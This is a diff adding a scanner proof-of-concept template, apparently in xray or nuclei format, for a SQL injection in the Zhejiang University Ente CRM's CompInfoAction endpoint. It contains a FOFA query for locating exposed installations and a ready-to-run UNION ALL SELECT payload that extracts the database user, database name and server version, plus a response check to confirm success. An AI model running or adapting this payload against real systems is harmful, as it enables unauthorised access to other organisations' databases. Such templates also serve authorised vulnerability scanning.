@@ -1,0 +1,17 @@
+id: poc-yaml-zhedaente-entsoft-compInfoaction
+info:
+  name: 浙大恩特客户资源管理系统 CompInfoAction SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 浙大恩特客户资源管理系统
+  fofa: title="欢迎使用浙大恩特客户资源管理系统" || body="script/Ent.base.js" || app="浙大恩特客户资源管理系统"
+variables:
+  t1: random_int(100,500)
+  t2: t1 * t1 * t1
+requests:
+- method: GET
+  path: /entsoft/CompInfoAction.emrser;.js?compnum=1'+UNION+ALL+SELECT+user,DB_NAME(),@@version,POWER({{.t1}},3),NULL--+&method=selectCompBank
+  expression: "status_code == 200 && \ncontains(body,\"\\\"bankename\\\"\") &&\ncontains(body,\
+    \ t2) &&\ncontains(body,\"\\\"banknum\\\"\")\n"
+transport: http
